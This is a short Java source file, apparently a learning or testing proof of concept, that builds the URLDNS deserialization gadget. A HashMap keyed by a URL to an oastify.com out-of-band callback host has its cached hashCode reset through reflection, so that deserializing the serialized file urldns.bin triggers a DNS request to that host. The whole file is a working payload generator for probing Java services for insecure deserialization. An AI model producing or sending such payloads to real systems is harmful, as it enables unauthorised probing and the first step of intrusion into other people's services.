package org.example;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class URLDNSLink {
    public static void main(String[] args) throws Exception{
        URL url= new URL("http://5z5le28itffu1d064y0lqwk9f0lr9g.oastify.com/");
        HashMap hashMap = new HashMap();

        Field urlField = url.getClass().getDeclaredField("hashCode");
        urlField.setAccessible(true);
        urlField.set(url,1234);
        hashMap.put(url,1);
        urlField.set(url,-1);
        // 写文件
//        //序列化
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./urldns.bin"));
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.close();
////        //反序列化
//        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("./cc1.txt"));
//        objectInputStream.readObject();

    }
}
